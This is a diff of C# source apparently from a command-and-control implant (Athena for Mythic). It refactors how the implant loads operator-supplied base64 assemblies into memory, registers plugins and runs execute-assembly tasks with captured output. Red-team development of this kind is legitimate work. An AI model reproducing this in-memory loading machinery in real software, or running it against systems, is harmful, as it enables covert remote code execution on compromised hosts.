@@ -55,9 +55,8 @@ namespace Athena.Commands
                     }
                 }
             }
-            catch (Exception e)
+            catch
             {
-                Console.WriteLine(e);
                 return false;
             }
             return false;
@@ -76,7 +75,7 @@ namespace Athena.Commands
             try
             {
 
-                if(la.target.IsEqualTo("A24BCF2198B1B13AD985304483F7F324")) //plugin
+                if (la.target.IsEqualTo("A24BCF2198B1B13AD985304483F7F324")) //plugin
                 {
                     this.commandContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(la.asm)));
                 }
@@ -133,7 +132,7 @@ namespace Athena.Commands
             }
 
             ExecuteAssemblyTask ea = JsonSerializer.Deserialize(job.task.parameters, ExecuteAssemblyTaskJsonContext.Default.ExecuteAssemblyTask);
-            
+
             //Indicating an execute-assembly task is running.
             this.assemblyIsRunning = true;
             this.assemblyTaskId = job.task.id;
@@ -141,7 +140,7 @@ namespace Athena.Commands
             //Add an alert for when the assembly is finished executing
             try
             {
-                using(this.executeAssemblyWriter = new StringWriter())
+                using (this.executeAssemblyWriter = new StringWriter())
                 {
                     //Capture StdOut
                     Console.SetOut(this.executeAssemblyWriter);
@@ -244,30 +243,37 @@ namespace Athena.Commands
 
             try
             {
-                //Load assembly into Context
                 var loadedAssembly = this.commandContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(command.asm)));
-
-                //Initialize the plugin
-                //Type t = loadedAssembly.GetType($"Plugin.{job.task.command.Replace("-", String.Empty)}");
-                Type t = loadedAssembly.GetType($"Plugins.Plugin");
-                IPlugin plugin = (IPlugin)Activator.CreateInstance(t);
-                
-                //Add plugin to tracker
-                this.loadedPlugins.GetOrAdd(command.command, plugin);
+                foreach (Type t in loadedAssembly.GetTypes())
+                {
+                    if (typeof(IPlugin).IsAssignableFrom(t))
+                    {
+                        IPlugin plug = (IPlugin)Activator.CreateInstance(t);
+                        this.loadedPlugins.GetOrAdd(command.command, plug);
+                        return new LoadCommandResponseResult()
+                        {
+                            completed = "true",
+                            user_output = "Command loaded!",
+                            task_id = job.task.id,
+                            commands = new List<CommandsResponse>()
+                                {
+                                    new CommandsResponse()
+                                    {
+                                        action = "add",
+                                        cmd = command.command,
+                                    }
+                                }
+                        }.ToJson();
+                    }
+                }
 
                 return new LoadCommandResponseResult()
                 {
                     completed = "true",
-                    user_output = "Command loaded!",
+                    user_output = "Failed to load command, no assignable type." + Environment.NewLine,
                     task_id = job.task.id,
-                    commands = new List<CommandsResponse>()
-                        {
-                            new CommandsResponse()
-                            {
-                                action = "add",
-                                cmd = command.command,
-                            }
-                        }
+                    status = "error",
+                    commands = new List<CommandsResponse>(),
                 }.ToJson();
             }
             catch (Exception e)
@@ -283,13 +289,13 @@ namespace Athena.Commands
 
             }
         }
-        
+
         public async Task<string> UnloadCommands(MythicJob job)
         {
             //LoadCommand command = JsonSerializer.Deserialize<LoadCommand>(job.task.parameters);
 
             List<CommandsResponse> unloaded = new List<CommandsResponse>();
-            
+
             return new LoadCommandResponseResult()
             {
                 completed = "true",
@@ -299,7 +305,7 @@ namespace Athena.Commands
             }.ToJson();
 
         }
-        
+
         /// <summary>
         /// Run a previously loaded command
         /// </summary>
